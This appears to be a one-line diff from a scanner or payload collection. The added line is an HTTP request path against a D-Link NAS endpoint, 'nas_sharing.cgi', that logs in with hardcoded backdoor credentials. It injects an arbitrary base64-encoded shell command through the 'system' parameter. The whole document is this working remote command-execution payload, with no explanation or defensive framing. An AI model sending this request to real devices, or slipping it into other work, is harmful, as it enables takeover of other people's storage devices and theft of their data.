@@ -1,0 +1,1 @@
+/cgi-bin/nas_sharing.cgi?user=mydlinkBRionyg&passwd=YWJjMTIzNDVjYmE&cmd=15&system={{base64(cmd)}}
